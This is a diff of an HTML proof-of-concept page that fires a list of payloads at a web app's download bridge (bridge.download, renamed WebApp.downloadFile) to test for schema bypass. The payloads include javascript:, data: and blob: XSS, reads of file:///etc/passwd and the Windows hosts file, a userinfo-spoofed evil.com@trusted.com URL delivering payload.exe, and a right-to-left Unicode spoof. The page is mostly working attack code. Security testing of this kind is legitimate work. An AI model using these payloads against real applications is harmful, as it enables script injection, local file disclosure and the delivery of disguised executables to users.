@@ -2,19 +2,13 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>bridge.download() Schema Bypass PoC</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
-    button { margin: 5px 0; padding: 6px 12px; font-size: 14px; cursor: pointer; }
-    .log { white-space: pre-wrap; margin-top: 20px; background: #222; padding: 10px; border-radius: 6px; }
-  </style>
+  <title>WebApp.downloadFile() PoC</title>
 </head>
 <body>
-  <h2>bridge.download() Bypass & Exploit Tester</h2>
+  <h3>WebApp.downloadFile() — Schema Bypass Test</h3>
 
   <div id="buttons"></div>
-
-  <div class="log" id="log">[LOG OUTPUT]</div>
+  <pre id="log">[LOG]</pre>
 
   <script>
     const log = (msg) => {
@@ -24,41 +18,44 @@
 
     const payloads = [
       {
-        name: "🔴 javascript: URI",
-        url: "javascript:alert('XSS via javascript:')"
+        name: "javascript: URI",
+        url: "javascript:alert('XSS via javascript:')",
+        filename: "xss.html"
       },
       {
-        name: "🟠 Encoded javascript:",
-        url: decodeURIComponent("javascript%3Aalert('Encoded XSS')")
+        name: "Encoded javascript:",
+        url: decodeURIComponent("javascript%3Aalert('Encoded XSS')"),
+        filename: "encoded_xss.html"
       },
       {
-        name: "🟡 data: URI",
-        url: "data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+"
+        name: "data: URI",
+        url: "data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+",
+        filename: "data_xss.html"
       },
       {
-        name: "🔵 blob: HTML",
+        name: "blob: HTML",
         dynamic: true,
-        content: `<html><body><script>alert('Blob XSS')</scrip</body></html>`,
+        content: `<html><body><script>alert('Blob XSS')</script></body></html>`,
         type: "text/html",
         filename: "blob-xss.html"
       },
       {
-        name: "🟤 file:///etc/passwd (Linux)",
+        name: "file:///etc/passwd (Linux)",
         url: "file:///etc/passwd",
         filename: "passwd.txt"
       },
       {
-        name: "🟣 file:///Windows/hosts (Windows)",
+        name: "file:///C:/Windows/hosts (Windows)",
         url: "file:///C:/Windows/System32/drivers/etc/hosts",
         filename: "hosts.txt"
       },
       {
-        name: "⚫ Obfuscated https with @",
-        url: "https://evil.com@attacker.ru/payload.exe",
-        filename: "fake-update.exe"
+        name: "https://evil.com@trusted.com",
+        url: "https://evil.com@trusted.com/payload.exe",
+        filename: "spoofed.exe"
       },
       {
-        name: "⚪ Unicode spoof (RTL)",
+        name: "Unicode RTL spoof",
         url: "https://\u202Evbscript.com",
         filename: "spoof.txt"
       }
@@ -74,10 +71,10 @@
           if (payload.dynamic) {
             const blob = new Blob([payload.content], { type: payload.type });
             const url = URL.createObjectURL(blob);
-            window.bridge.download({ url, name: payload.filename });
-            log(`✔ Triggered: ${payload.name} (blob: ${url})`);
+            WebApp.downloadFile({ url, name: payload.filename });
+            log(`✔ Triggered dynamic: ${payload.name}`);
           } else {
-            window.bridge.download({ url: payload.url, name: payload.filename || "test.txt" });
+            WebApp.downloadFile({ url: payload.url, name: payload.filename });
             log(`✔ Triggered: ${payload.name} → ${payload.url}`);
           }
         } catch (err) {
@@ -85,6 +82,7 @@
         }
       };
       container.appendChild(btn);
+      container.appendChild(document.createElement("br"));
     });
   </script>
 </body>
